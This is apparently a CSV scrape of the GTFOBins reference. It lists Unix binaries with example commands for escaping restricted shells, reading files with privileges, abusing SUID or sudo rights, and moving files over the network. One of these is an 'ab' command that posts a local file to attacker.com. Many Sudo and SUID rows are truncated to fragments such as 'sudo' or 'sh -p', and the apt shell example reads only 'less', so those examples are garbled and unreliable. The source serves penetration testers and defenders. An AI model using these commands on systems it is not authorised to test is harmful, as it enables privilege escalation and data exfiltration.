Binary,Function Name,Function URL,Description,Example
7z,File read,https://gtfobins.github.io/gtfobins/7z/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
7z,Sudo,https://gtfobins.github.io/gtfobins/7z/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aa-exec,Shell,https://gtfobins.github.io/gtfobins/aa-exec/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aa-exec /bin/sh
aa-exec,SUID,https://gtfobins.github.io/gtfobins/aa-exec/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
aa-exec,Sudo,https://gtfobins.github.io/gtfobins/aa-exec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ab,File upload,https://gtfobins.github.io/gtfobins/ab/#file-upload,It can exfiltrate files on the network.,"URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL"
ab,File download,https://gtfobins.github.io/gtfobins/ab/#file-download,It can download remote files.,"URL=http://attacker.com/file_to_download
ab -v2 $URL"
ab,SUID,https://gtfobins.github.io/gtfobins/ab/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ab,Sudo,https://gtfobins.github.io/gtfobins/ab/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
agetty,SUID,https://gtfobins.github.io/gtfobins/agetty/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,File read,https://gtfobins.github.io/gtfobins/alpine/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
alpine -F ""$LFILE"""
alpine,SUID,https://gtfobins.github.io/gtfobins/alpine/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
alpine,Sudo,https://gtfobins.github.io/gtfobins/alpine/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-playbook,Shell,https://gtfobins.github.io/gtfobins/ansible-playbook/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF"
ansible-playbook,Sudo,https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ansible-test,Shell,https://gtfobins.github.io/gtfobins/ansible-test/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ansible-test shell
ansible-test,Sudo,https://gtfobins.github.io/gtfobins/ansible-test/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
aoss,Shell,https://gtfobins.github.io/gtfobins/aoss/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,aoss /bin/sh
aoss,Sudo,https://gtfobins.github.io/gtfobins/aoss/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apache2ctl,File read,https://gtfobins.github.io/gtfobins/apache2ctl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
apache2ctl -c ""Include $LFILE"" -k stop"
apache2ctl,Sudo,https://gtfobins.github.io/gtfobins/apache2ctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt-get,Shell,https://gtfobins.github.io/gtfobins/apt-get/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt-get,Sudo,https://gtfobins.github.io/gtfobins/apt-get/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
apt,Shell,https://gtfobins.github.io/gtfobins/apt/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
apt,Sudo,https://gtfobins.github.io/gtfobins/apt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ar,File read,https://gtfobins.github.io/gtfobins/ar/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -u)
LFILE=file_to_read
ar r ""$TF"" ""$LFILE""
cat ""$TF"""
